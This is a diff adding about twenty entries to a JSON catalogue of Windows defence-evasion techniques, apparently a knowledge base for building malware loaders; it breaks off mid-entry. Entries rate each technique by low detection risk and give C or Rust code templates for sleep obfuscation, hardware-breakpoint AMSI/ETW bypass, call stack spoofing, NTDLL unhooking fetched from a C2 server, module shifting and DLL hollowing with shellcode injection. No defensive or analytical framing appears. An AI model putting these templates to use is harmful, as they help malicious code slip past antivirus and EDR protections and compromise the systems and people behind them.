@@ -1,6 +1,6 @@
 {
   "version": "1.1",
-  "last_updated": "2026-03-06T12:26:50.290217",
+  "last_updated": "2026-03-06T14:20:53.200021",
   "techniques": [
     {
       "id": "T001",
@@ -1662,6 +1662,829 @@
       "created_at": "2026-03-06T12:26:50.290217",
       "id": "T087",
       "category": "evasion"
+    },
+    {
+      "name": "Ekko Timer Queue Sleep Obfuscation",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Timer queue-based sleep obfuscation technique that uses CreateTimerQueueTimer and ROP chains via NtContinue to encrypt shellcode memory during sleep.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateTimerQueue",
+        "CreateTimerQueueTimer",
+        "NtContinue",
+        "SystemFunction032",
+        "VirtualProtect"
+      ],
+      "id": "T088",
+      "created_at": "2026-03-06T12:46:35.016078",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Cronos Waitable Timer Sleep Obfuscation",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Waitable timer-based sleep obfuscation using CreateWaitableTimer and SetWaitableTimer with ROP chains. Creates multiple APC contexts for VirtualProtect, SystemFunction032 encryption, and sleep operations. Uses ROP gadgets (pop rcx; ret, pop rdx; ret, add rsp, 0x20; pop rdi; ret) for calling SleepEx with alertable=TRUE to trigger the queued APC callbacks. Encrypts PE image during sleep using AES-128 via SystemFunction032.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateWaitableTimer",
+        "SetWaitableTimer",
+        "NtContinue",
+        "SystemFunction032",
+        "VirtualProtect",
+        "SleepEx",
+        "RtlCaptureContext"
+      ],
+      "source": "github: Idov31/Cronos",
+      "references": [
+        "https://github.com/Idov31/Cronos"
+      ],
+      "code_template": "// Cronos sleep obfuscation with waitable timers\nHANDLE hTimer = CreateWaitableTimerW(NULL, TRUE, NULL);\nLARGE_INTEGER dueTime = { .QuadPart = -delay * 10000LL };\n\n// Capture context and set up ROP chain\nCONTEXT ctx = { .ContextFlags = CONTEXT_FULL };\nSetWaitableTimer(hTimer, &dueTime, 0, RtlCaptureContext, &ctx, FALSE);\n\n// Queue multiple timer callbacks for: VirtualProtect(RW) -> Encrypt -> Sleep -> Decrypt -> VirtualProtect(RX)\nSetWaitableTimer(hProtectionRWTimer, &protectionRWDueTime, 0, NtContinue, &ctxProtectionRW, FALSE);\nSetWaitableTimer(hEncryptionTimer, &encryptionDueTime, 0, NtContinue, &ctxEncryption, FALSE);",
+      "id": "T089",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "Shelter ROP-Based Sleep Obfuscation",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "ROP-based sleep obfuscation written in Rust that encrypts the entire PE or memory region during sleep using AES-128-CBC via BCrypt API. Uses ROP gadgets to call NtProtectVirtualMemory, BCryptEncrypt/Decrypt, and NtWaitForSingleObject without executing any code in the protected memory region. The stack is manipulated to execute a ROP chain that changes memory permissions, encrypts, waits, decrypts, and restores permissions.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "BCryptOpenAlgorithmProvider",
+        "BCryptGenerateSymmetricKey",
+        "BCryptEncrypt",
+        "BCryptDecrypt",
+        "NtProtectVirtualMemory",
+        "NtWaitForSingleObject"
+      ],
+      "source": "github: Kudaes/Shelter",
+      "references": [
+        "https://github.com/Kudaes/Shelter"
+      ],
+      "code_template": "// ROP-based sleep with AES encryption (Rust)\nlet mut configuration: RopConfiguration = unsafe { std::mem::zeroed() };\nconfiguration.ntprotectvm = ntprotectvm_addr;\nconfiguration.ntwaitobj = ntwaitobject_addr;\nconfiguration.bencrypt = bcrypt_encrypt_addr;\nconfiguration.bdecrypt = bcrypt_decrypt_addr;\n\n// Find ROP gadgets in legitimate modules\nlet god_gadget = find_gadget(\"\\\\xff\\\\xe0\", \"xx\"); // jmp rax\nlet gadget1 = find_gadget(\"\\\\x59\\\\xc3\", \"xx\"); // pop rcx; ret\n\n// Execute ROP chain to: VirtualProtect -> Encrypt -> Sleep -> Decrypt -> VirtualProtect",
+      "id": "T090",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "HWSyscalls - Hardware Breakpoint Indirect Syscalls",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Indirect syscall technique using hardware breakpoints (DR0-DR3) combined with HalosGate for SSN resolution. Sets hardware breakpoints at the syscall instruction and ret instruction addresses. Uses VEH exception handler to intercept execution, save context, and redirect to a synthetic trampoline in kernel32.dll. When the syscall is about to execute, HWBP triggers, the handler saves registers and redirects execution. When ret is hit, the original stack is restored, hiding the call stack.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "SetThreadContext",
+        "GetThreadContext",
+        "AddVectoredExceptionHandler",
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory"
+      ],
+      "source": "github: Dec0ne/HWSyscalls",
+      "references": [
+        "https://github.com/Dec0ne/HWSyscalls"
+      ],
+      "code_template": "// HWSyscalls - Hardware breakpoint syscall interception\nLONG WINAPI HwBpHandler(PEXCEPTION_POINTERS ExceptionInfo) {\n    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {\n        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == SyscallEntryAddr) {\n            // Save context when hitting syscall\n            memcpy(SavedContext, ExceptionInfo->ContextRecord, sizeof(CONTEXT));\n            // Redirect to our trampoline\n            ExceptionInfo->ContextRecord->Rip = TrampolineAddr;\n            ExceptionInfo->ContextRecord->EFlags |= TRACE_FLAG;\n            return EXCEPTION_CONTINUE_EXECUTION;\n        }\n        else if (ExceptionInfo->ExceptionRecord->ExceptionAddress == SyscallRetAddr) {\n            // Restore original stack on ret\n            ExceptionInfo->ContextRecord->Rsp = SavedContext->Rsp;\n            return EXCEPTION_CONTINUE_EXECUTION;\n        }\n    }\n}",
+      "id": "T091",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "Hardware Breakpoint Call Stack Spoofing",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Call stack spoofing using hardware breakpoints to intercept both syscalls and API calls. Creates a fake call stack in heap memory with return addresses pointing to legitimate modules. Sets HWBP on target function addresses to intercept execution, swap to fake stack, execute the function, then restore original stack. Uses a canary value (0xDEADBEEFCAFEBABE) to locate stored context on stack. The fake stack is built from known stack frames in legitimate DLLs.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "SetThreadContext",
+        "GetThreadContext",
+        "AddVectoredExceptionHandler",
+        "VirtualAlloc",
+        "RtlCaptureContext"
+      ],
+      "source": "github: fortra/hw-call-stack",
+      "references": [
+        "https://github.com/fortra/hw-call-stack"
+      ],
+      "code_template": "// HWBP call stack spoofing\nVOID set_hardware_breakpoint(const DWORD tid, const uintptr_t address, const UINT pos) {\n    CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };\n    GetThreadContext(hThread, &context);\n    \n    // Set DR0-DR3 to address, enable local breakpoint\n    (&context.Dr0)[pos] = address;\n    context.Dr7 |= 1ull << (2 * pos);  // Enable bit\n    context.Dr7 &= ~(3ull << (16 + 4 * pos));  // Execute breakpoint (RW=00)\n    \n    SetThreadContext(hThread, &context);\n}\n\n// In VEH handler, swap to fake stack, execute, then restore",
+      "id": "T092",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "LayeredSyscall - VEH Call Stack Generation",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Generates legitimate call stack frames using Vectored Exception Handling (VEH) combined with indirect syscalls. Uses HWBP to trigger exceptions when calling sensitive NT APIs, then builds a fake call stack in the exception handler that appears to come from legitimate modules (ntdll.dll, kernel32.dll). The synthetic call stack includes BaseThreadInitThunk and RtlUserThreadStart return addresses, making the call chain look legitimate to EDR stack inspection.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "AddVectoredExceptionHandler",
+        "SetThreadContext",
+        "GetThreadContext",
+        "NtAllocateVirtualMemory",
+        "NtProtectVirtualMemory"
+      ],
+      "source": "github: WKL-Sec/LayeredSyscall",
+      "references": [
+        "https://github.com/WKL-Sec/LayeredSyscall"
+      ],
+      "code_template": "// LayeredSyscall VEH handler for stack generation\nLONG WINAPI vehHandler(PEXCEPTION_POINTERS pExceptionInfo) {\n    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {\n        // Check if hitting our target syscall\n        if (pExceptionInfo->ContextRecord->Rip == targetSyscallAddr) {\n            // Save current context\n            memcpy(&savedCtx, pExceptionInfo->ContextRecord, sizeof(CONTEXT));\n            \n            // Find stack frame in legitimate module (e.g., sub rsp, 0x58; ... call)\n            // Set up fake return addresses to BaseThreadInitThunk, RtlUserThreadStart\n            pExceptionInfo->ContextRecord->Rsp = fakeStackAddr;\n            pExceptionInfo->ContextRecord->EFlags |= TRACE_FLAG;\n        }\n    }\n}",
+      "id": "T093",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "Fileless NTDLL Unhooking from Remote Server",
+      "type": "unhooking",
+      "evasion_type": "unhooking",
+      "description": "Unhooks NTDLL by fetching a clean copy from a remote HTTP server instead of reading from disk. Avoids disk-based detection by downloading the clean NTDLL .text section from a C2 server, then patching the hooked NTDLL in memory. The remote server serves the clean .text section bytes which are then copied over the hooked NTDLL functions. Alternative sources include KnownDlls, suspended processes, and SSE (Shellcode Execution Environment).",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "InternetOpen",
+        "InternetConnect",
+        "HttpOpenRequest",
+        "HttpSendRequest",
+        "InternetReadFile",
+        "VirtualProtect",
+        "NtQueryInformationProcess"
+      ],
+      "source": "github: SaadAhla/ntdlll-unhooking-collection",
+      "references": [
+        "https://github.com/SaadAhla/ntdlll-unhooking-collection"
+      ],
+      "code_template": "// Fetch clean NTDLL from remote server\nHINTERNET hInternet = InternetOpenA(\"Mozilla/5.0\", 0, NULL, NULL, 0);\nHINTERNET hConnect = InternetConnectA(hInternet, server, port, NULL, NULL, 0, 0, 0);\nHINTERNET hRequest = HttpOpenRequestA(hConnect, \"GET\", \"/ntdll_text.bin\", NULL, NULL, NULL, 0, 0);\nHttpSendRequestA(hRequest, NULL, 0, NULL, 0);\n\n// Read clean .text section\nInternetReadFile(hRequest, buffer, textSize, &bytesRead);\n\n// Patch hooked NTDLL\nPVOID ntdllBase = GetModuleHandleA(\"ntdll.dll\");\nVirtualProtect(ntdllBase + textOffset, textSize, PAGE_EXECUTE_READWRITE, &old);\nmemcpy(ntdllBase + textOffset, buffer, textSize);\nVirtualProtect(ntdllBase + textOffset, textSize, old, &old);",
+      "id": "T094",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "SilentMoonwalk Dynamic Call Stack Spoofing",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Fully dynamic call stack spoofing PoC that generates fake stack frames at runtime. Finds gadgets in legitimate modules to build return address chains. Uses a linked list of stack frames where each frame contains a return address and saved RBP. The fake stack is built to mimic a legitimate call chain, and execution is redirected via NtContinue with the spoofed context. Supports both x64 and x86 architectures.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "NtContinue",
+        "RtlCaptureContext",
+        "VirtualProtect",
+        "VirtualQuery"
+      ],
+      "source": "github: klezVirus/SilentMoonwalk",
+      "references": [
+        "https://github.com/klezVirus/SilentMoonwalk"
+      ],
+      "code_template": "// SilentMoonwalk dynamic stack spoofing\nstruct STACK_FRAME {\n    PVOID returnAddr;  // Gadget address in legitimate module\n    PVOID savedRbp;\n};\n\n// Find gadgets like: mov rbp, rsp; ... ret\nPVOID FindGadget(LPCSTR moduleName, PBYTE pattern, PCHAR mask);\n\n// Build fake call stack\nSTACK_FRAME fakeStack[3] = {\n    { gadgetInNtdll, NULL },\n    { gadgetInKernel32, NULL },\n    { BaseThreadInitThunk, NULL }\n};\n\n// Execute with spoofed stack via NtContinue\nCONTEXT ctx = { .ContextFlags = CONTEXT_FULL };\nRtlCaptureContext(&ctx);\nctx.Rsp = (DWORD64)&fakeStack[2];\nctx.Rip = targetFunction;\nNtContinue(&ctx, FALSE);",
+      "id": "T095",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "Patchless AMSI/ETW Bypass via Hardware Breakpoint",
+      "type": "amsi_etw_bypass",
+      "evasion_type": "amsi_etw_bypass",
+      "description": "Bypasses AMSI and ETW without patching memory by using hardware breakpoints and VEH exception handlers. Sets hardware breakpoints on AMSI/ETW functions (AmsiScanBuffer, EtwEventWrite) using debug registers DR0-DR3. When these functions are called, the VEH handler intercepts execution and modifies the return value to return AMSI_RESULT_CLEAN or STATUS_SUCCESS, then skips the actual function call. Leaves no memory modifications that can be detected by integrity checks.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "AddVectoredExceptionHandler",
+        "SetThreadContext",
+        "GetThreadContext",
+        "AmsiScanBuffer",
+        "EtwEventWrite"
+      ],
+      "source": "github: VoldeSec/PatchlessCLRLoader",
+      "references": [
+        "https://github.com/VoldeSec/PatchlessCLRLoader"
+      ],
+      "code_template": "// Patchless AMSI bypass via hardware breakpoint\nLONG WINAPI AmsiBypassHandler(PEXCEPTION_POINTERS pExceptionInfo) {\n    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {\n        if (pExceptionInfo->ExceptionRecord->ExceptionAddress == pAmsiScanBuffer) {\n            // Set return value to AMSI_RESULT_CLEAN\n            pExceptionInfo->ContextRecord->Rax = AMSI_RESULT_CLEAN;\n            // Skip the function by moving RIP past the function\n            pExceptionInfo->ContextRecord->Rip = pExceptionInfo->ContextRecord->Rsp;\n            // Restore RSP as if function returned normally\n            pExceptionInfo->ContextRecord->Rsp += 8;\n            return EXCEPTION_CONTINUE_EXECUTION;\n        }\n    }\n    return EXCEPTION_CONTINUE_SEARCH;\n}\n\n// Set hardware breakpoint on AmsiScanBuffer\nAddVectoredExceptionHandler(1, AmsiBypassHandler);\nCONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };\nGetThreadContext(GetCurrentThread(), &ctx);\nctx.Dr0 = (DWORD64)pAmsiScanBuffer;\nctx.Dr7 |= 1;\nSetThreadContext(GetCurrentThread(), &ctx);",
+      "id": "T096",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "Thread Stack Spoofing via Return Address Overwrite",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Spoofs thread call stack by overwriting the return address on the stack during Sleep. When Sleep is called, the return address is saved and replaced with 0, effectively truncating the call stack from EDR memory scanners. After Sleep returns, the original return address is restored. This hides the shellcode memory allocation from call stack walking analysis. Hooks Sleep function to intercept and modify the stack.",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "Sleep",
+        "SleepEx",
+        "VirtualProtect"
+      ],
+      "source": "github: mgeeky/ThreadStackSpoofer",
+      "references": [
+        "https://github.com/mgeeky/ThreadStackSpoofer"
+      ],
+      "code_template": "// Hook Sleep to spoof call stack\nvoid WINAPI HookedSleep(DWORD dwMilliseconds) {\n    // Locate stack frame's return address\n    auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();\n    const auto origReturnAddress = *overwrite;\n    \n    // Truncate call stack by setting return address to 0\n    *overwrite = 0;\n    \n    // Sleep (stack is now truncated)\n    ::SleepEx(dwMilliseconds, false);\n    \n    // Restore original return address\n    *overwrite = origReturnAddress;\n}\n\n// Install hook on Sleep\nBYTE sleepStub[14];\nmemcpy(sleepStub, (void*)Sleep, 14);\nVirtualProtect((void*)Sleep, 14, PAGE_EXECUTE_READWRITE, &old);\n// Write trampoline to HookedSleep...",
+      "id": "T097",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "Module Shifting Injection",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Stealthier variation of Module Stomping that reduces memory IoCs. Instead of overwriting an entire module, it shifts the module's code section to make room for shellcode at the beginning, preserving some original module bytes. The original bytes are restored before module unloading. This avoids the telltale sign of having an entire module with completely overwritten code, while still hiding shellcode in a legitimate module's memory space.",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "LoadLibrary",
+        "VirtualProtect",
+        "VirtualQuery",
+        "NtUnmapViewOfSection"
+      ],
+      "source": "github: naksyn/ModuleShifting",
+      "references": [
+        "https://github.com/naksyn/ModuleShifting"
+      ],
+      "code_template": "// Module Shifting - shift code section and inject shellcode\nHMODULE hModule = LoadLibraryA(\"legitimate.dll\");\nPIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);\nPIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(ntHeaders);\n\n// Shift .text section content\nDWORD textOffset = textSection->VirtualAddress;\nDWORD textSize = textSection->Misc.VirtualSize;\nBYTE* textBase = (BYTE*)hModule + textOffset;\n\nVirtualProtect(textBase, textSize, PAGE_READWRITE, &old);\n\n// Shift original code down\nmemmove(textBase + shellcodeSize, textBase, textSize - shellcodeSize);\n\n// Write shellcode at beginning of .text section\nmemcpy(textBase, shellcode, shellcodeSize);\n\n// Execute\n((void(*)())textBase)();",
+      "id": "T098",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "syscalls-cpp Modern C++20 Syscall Library",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Modern C++20 header-only library for advanced direct system call invocation. Provides type-safe syscall wrappers with compile-time SSN resolution. Supports both direct and indirect syscalls with automatic SSN extraction from NTDLL. Uses templates and concepts for clean API design. Handles WoW64 transitions automatically and provides syscall number caching for performance.",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory",
+        "NtProtectVirtualMemory",
+        "NtCreateThreadEx"
+      ],
+      "source": "github: sapdragon/syscalls-cpp",
+      "references": [
+        "https://github.com/sapdragon/syscalls-cpp"
+      ],
+      "code_template": "// syscalls-cpp modern C++20 syscall library\n#include <syscalls/syscalls.hpp>\n\nusing namespace syscalls;\n\n// Type-safe syscall invocation\nauto status = syscall<nt::NtAllocateVirtualMemory>(\n    GetCurrentProcess(),\n    &baseAddress,\n    0,\n    &regionSize,\n    MEM_COMMIT | MEM_RESERVE,\n    PAGE_READWRITE\n);\n\n// Indirect syscall (jumps to NTDLL syscall instruction)\nauto status = indirect_syscall<nt::NtWriteVirtualMemory>(\n    GetCurrentProcess(),\n    baseAddress,\n    shellcode,\n    shellcodeSize,\n    &bytesWritten\n);",
+      "id": "T099",
+      "created_at": "2026-03-06T12:48:29.708240",
+      "category": "evasion"
+    },
+    {
+      "name": "Gargoyle Memory Scanning Evasion",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Memory scanning evasion technique that uses ROP gadgets and waitable timers to hide executable code when not in use. The PIC (Position Independent Code) marks itself as non-executable (PAGE_READWRITE) after execution and uses CreateWaitableTimer/SetWaitableTimer to schedule re-execution. Finds ROP gadgets (pop ecx; pop esp; ret or pop eax; pop esp; ret) in system DLLs like mshtml.dll to create a stack trampoline that flips memory permissions, executes payload, then flips back to RW and waits.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateWaitableTimer",
+        "SetWaitableTimer",
+        "VirtualProtectEx",
+        "WaitForSingleObjectEx",
+        "LoadLibrary"
+      ],
+      "source": "github: JLospinoso/gargoyle",
+      "references": [
+        "https://github.com/JLospinoso/gargoyle"
+      ],
+      "code_template": "// Gargoyle memory evasion with ROP and timers\nstruct SetupConfiguration {\n    void* setup_address;\n    uint32_t setup_length;\n    void* VirtualProtectEx;\n    void* WaitForSingleObjectEx;\n    void* CreateWaitableTimer;\n    void* SetWaitableTimer;\n    void* tramp_addr;\n    void* sleep_handle;\n    uint32_t interval;\n};\n\n// ROP gadget: pop ecx; pop esp; ret\n// Stack trampoline flips permissions: RX -> execute -> RW -> wait\nVirtualProtectEx(GetCurrentProcess(), pic, picSize, PAGE_READWRITE, &old);\n// Wait for timer\nSetWaitableTimer(hTimer, &dueTime, 0, trampoline, &config, FALSE);",
+      "id": "T100",
+      "created_at": "2026-03-06T12:49:41.708636",
+      "category": "evasion"
+    },
+    {
+      "name": "Phantom DLL Hollowing",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Advanced DLL injection technique that maps a phantom DLL into target process memory without using LoadLibrary. Creates a phantom DLL image by mapping the DLL from disk, then hollowing out (overwriting) the legitimate DLL's code section with malicious payload while preserving the legitimate module's metadata. The phantom appears as a legitimate loaded module in the PEB, avoiding suspicious memory regions. Unlinks from PEB lists to hide from module enumeration.",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "NtCreateSection",
+        "NtMapViewOfSection",
+        "NtUnmapViewOfSection",
+        "VirtualProtect",
+        "LdrLoadDll"
+      ],
+      "source": "github: forrest-orr/phantom-dll-hollower-poc",
+      "references": [
+        "https://github.com/forrest-orr/phantom-dll-hollower-poc"
+      ],
+      "code_template": "// Phantom DLL hollowing\nHANDLE hSection;\nNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n\n// Map section into target process\nPVOID remoteAddr = NULL;\nNtMapViewOfSection(hSection, hTargetProcess, &remoteAddr, NULL, NULL, NULL, &viewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);\n\n// Write phantom DLL header + malicious code\nmemcpy(remoteAddr, phantomDllHeaders, headersSize);\nmemcpy(remoteAddr + textSectionOffset, shellcode, shellcodeSize);\n\n// The phantom appears as legitimate DLL in PEB but contains malicious code",
+      "id": "T101",
+      "created_at": "2026-03-06T12:49:41.708636",
+      "category": "evasion"
+    },
+    {
+      "name": "DreamWalkers Reflective Loader with Stack Spoofing",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Reflective shellcode loader with advanced call stack spoofing and .NET support. Generates fake call stacks at runtime by finding gadgets in legitimate modules. Supports both native shellcode and .NET assembly loading. The stack spoofing creates realistic call chains that pass through ntdll.dll, kernel32.dll, and other legitimate modules, making the execution appear normal to EDR stack inspection.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "LoadLibrary",
+        "GetProcAddress",
+        "VirtualAlloc",
+        "CLRCreateInstance",
+        "MetaDataDispenser"
+      ],
+      "source": "github: maxDcb/DreamWalkers",
+      "references": [
+        "https://github.com/maxDcb/DreamWalkers"
+      ],
+      "code_template": "// DreamWalkers stack spoofing and reflective loading\n// Find gadgets for stack frame construction\nPVOID FindGadget(LPCSTR moduleName, PBYTE pattern, PCHAR mask) {\n    // Search for pattern like: mov rbp, rsp; ... ret\n}\n\n// Build fake stack frames\nstruct FakeFrame {\n    PVOID returnAddr;  // Points to gadget in legitimate module\n    PVOID savedRbp;\n};\n\nFakeFrame stack[] = {\n    { gadget_ntdll, prevRbp },\n    { gadget_kernel32, prevRbp2 },\n    { BaseThreadInitThunk, 0 }\n};\n\n// Execute with spoofed stack",
+      "id": "T102",
+      "created_at": "2026-03-06T12:49:41.708636",
+      "category": "evasion"
+    },
+    {
+      "name": "Unwinder Call Stack Spoofing for Rust",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Rust implementation of call stack spoofing that mimics legitimate program behavior. Provides a Rust library for transparently spoofing call stacks when making syscalls or Windows API calls. Handles stack unwinding properly to maintain consistent fake call chains. Supports finding gadgets dynamically and building fake frames that pass through legitimate modules.",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "RtlCaptureContext",
+        "NtContinue",
+        "VirtualProtect"
+      ],
+      "source": "github: Kudaes/Unwinder",
+      "references": [
+        "https://github.com/Kudaes/Unwinder"
+      ],
+      "code_template": "// Rust call stack spoofing with Unwinder\nuse unwinder::spoof_call;\n\n// Spoof a syscall with fake call stack\nlet result = spoof_call(\n    NtAllocateVirtualMemory as usize,\n    &[\n        GetCurrentProcess() as usize,\n        &mut base_address as *mut _ as usize,\n        0,\n        &mut region_size as *mut _ as usize,\n        MEM_COMMIT | MEM_RESERVE,\n        PAGE_READWRITE\n    ],\n    &fake_stack_frames  // Pre-built fake frames\n);\n\n// The call stack will appear to come from legitimate modules",
+      "id": "T103",
+      "created_at": "2026-03-06T12:49:41.708636",
+      "category": "evasion"
+    },
+    {
+      "name": "LLVM Call Obfuscator Plugin",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "LLVM compiler plugin that transparently applies stack spoofing and indirect syscalls to Windows x64 native calls at compile time. Automatically transforms all Windows API calls to use indirect syscalls with spoofed call stacks. No source code modifications required - the plugin handles everything at the IR level during compilation. Supports custom gadget finding and stack frame generation.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [],
+      "source": "github: janoglezcampos/llvm-yx-callobfuscator",
+      "references": [
+        "https://github.com/janoglezcampos/llvm-yx-callobfuscator"
+      ],
+      "code_template": "# LLVM call obfuscator compilation\n# Compile with the plugin to automatically apply stack spoofing\nclang -Xclang -load -Xclang LLVMCallObfuscatorPass.so \\\n      -target x86_64-pc-windows-msvc \\\n      -DINDIRECT_SYSCALLS \\\n      -DSTACK_SPOOFING \\\n      source.c -o output.exe\n\n# All Windows API calls are automatically transformed to:\n# 1. Resolve SSN dynamically\n# 2. Find syscall instruction address in ntdll\n# 3. Build fake call stack\n# 4. Execute indirect syscall with spoofed stack",
+      "id": "T104",
+      "created_at": "2026-03-06T12:49:41.708636",
+      "category": "evasion"
+    },
+    {
+      "name": "VEH-based Syscall Invocation",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Uses Vectored Exception Handling (VEH) to invoke syscalls without directly calling ntdll functions. Registers a VEH handler that intercepts INT 3 (breakpoint) exceptions. Sets up breakpoints at specific locations that trigger the VEH handler, which then performs the actual syscall. The call stack appears clean because the syscall happens in the exception handler context. Combines well with hardware breakpoints for additional evasion.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "AddVectoredExceptionHandler",
+        "RaiseException",
+        "DebugBreak",
+        "SetThreadContext"
+      ],
+      "source": "github: patrickt2017/VEHNetLoader",
+      "references": [
+        "https://github.com/patrickt2017/VEHNetLoader"
+      ],
+      "code_template": "// VEH-based syscall invocation\nLONG WINAPI VehSyscallHandler(PEXCEPTION_POINTERS pExceptionInfo) {\n    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {\n        // Get syscall parameters from context\n        DWORD ssn = pExceptionInfo->ContextRecord->Rax;\n        \n        // Execute syscall directly\n        __asm__ volatile (\n            \"mov r10, rcx\\n\"\n            \"syscall\\n\"\n        );\n        \n        // Skip past INT 3\n        pExceptionInfo->ContextRecord->Rip++;\n        return EXCEPTION_CONTINUE_EXECUTION;\n    }\n    return EXCEPTION_CONTINUE_SEARCH;\n}\n\n// Register VEH and invoke syscall\nAddVectoredExceptionHandler(1, VehSyscallHandler);\n__debugbreak();  // INT 3 to trigger VEH",
+      "id": "T105",
+      "created_at": "2026-03-06T12:49:41.708636",
+      "category": "evasion"
+    },
+    {
+      "name": "Early Cryo Bird Injection",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "APC injection using frozen Job Objects to create pre-frozen processes. Process is created in a frozen state via Job Object freeze information, allowing stealthier shellcode injection before process starts executing",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "NtCreateJobObject",
+        "NtSetInformationJobObject",
+        "NtQueueApcThread",
+        "NtAllocateVirtualMemoryEx",
+        "NtAssignProcessToJobObject"
+      ],
+      "id": "T106",
+      "created_at": "2026-03-06T12:53:01.524246",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "EnumerateLoadedModules Callback Execution",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Execute shellcode via EnumerateLoadedModules callback from Dbghelp.dll. Uses loaded module enumeration callback mechanism to trigger code execution without explicit thread creation",
+      "complexity": "medium",
+      "detection_risk": "medium",
+      "apis": [
+        "EnumerateLoadedModules",
+        "LoadLibrary"
+      ],
+      "id": "T107",
+      "created_at": "2026-03-06T12:53:01.830563",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "ReadProcessMemory Indirect Write",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Exploit ReadProcessMemory lpNumberOfBytesRead parameter to write shellcode indirectly. The out pointer parameter enables writing to process memory without using common APIs like memcpy or WriteProcessMemory",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "ReadProcessMemory"
+      ],
+      "id": "T108",
+      "created_at": "2026-03-06T12:53:02.248777",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Threadless Injection",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Inject shellcode into existing process without creating new thread by manipulating existing thread context or using existing callbacks. Avoids creating new threads which is heavily monitored by EDR",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "SetThreadContext",
+        "NtContinue",
+        "OpenThread"
+      ],
+      "id": "T109",
